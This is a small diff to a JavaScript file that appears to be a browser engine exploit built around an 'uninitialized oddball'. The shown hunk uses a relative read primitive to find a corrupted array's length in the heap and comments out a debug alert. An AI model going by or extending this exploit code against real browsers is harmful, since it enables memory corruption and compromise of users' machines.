@@ -352,7 +352,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
     // Search for `corrupted_array` in oldspace using 16MB relative read
     let [length_offset, position] = search_for_length();
     var old_length_value =  relative_read64(length_offset);
-    alert(hex(old_length_value));
+    // alert(hex(old_length_value));
     helpers.set_i64(old_length_value);
     if (position == 0) {
         helpers.set_l(0xfffffffe);
